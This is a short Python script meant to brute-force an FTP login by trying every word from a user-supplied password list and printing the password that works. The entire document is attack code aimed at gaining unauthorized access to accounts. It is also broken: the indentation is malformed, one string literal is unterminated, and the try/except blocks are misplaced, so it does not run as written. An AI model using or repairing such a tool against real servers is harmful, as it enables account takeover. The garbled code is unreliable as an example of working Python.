#!/bin/python3

import ftplib

server=input("FTP Server: ")
user = input("Username: ")

Passwordlist = input("Put to Password List > ")

try:
    with open(Passwordlist, 'r') as pw:
        for word in pw:
        word = word.strip('\r').strip('\')

try:
    ftp = ftplib.FTP(server)
    ftp.login(user, word)

    print("Success! The password is " + word)

    except:
    print("still trying......")

except:
    print("Wordlist error")
